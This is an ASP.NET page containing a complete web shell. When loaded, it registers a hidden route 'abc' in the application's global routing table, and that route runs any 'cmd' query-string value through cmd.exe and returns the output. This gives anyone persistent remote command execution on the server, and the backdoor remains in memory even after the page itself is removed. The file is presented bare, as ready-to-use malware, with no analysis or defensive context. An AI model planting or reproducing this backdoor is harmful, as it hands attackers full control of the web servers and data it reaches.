<%@ Page Language="c#"%>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Web.Routing" %>

<script runat="server">
    public class MyRoute : IRouteHandler
    {
        public IHttpHandler GetHttpHandler(RequestContext requestContext)
        {
            return new MyHandler(requestContext);
        }
    }

    public class MyHandler : IHttpHandler
    {
        public RequestContext RequestContext { get; private set; }

        public MyHandler(RequestContext context)
        {
            this.RequestContext = context;
        }

        public bool IsReusable
        {
            get { return false; }
        }

        public void ProcessRequest(HttpContext context)
        {
            String cmd = context.Request.QueryString["cmd"];
            if (cmd != null)
            {
                HttpResponseBase response = new HttpResponseWrapper(context.Response);
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c " + cmd;
                Debug.WriteLine(p.StartInfo.FileName);
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();
                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                response.Write(System.Text.Encoding.Default.GetString(data));
            }
        }
    }
</script>

<%
    Response.Write("ok");
    RouteTable.Routes.Insert(0, new Route("abc", new MyRoute()));
%>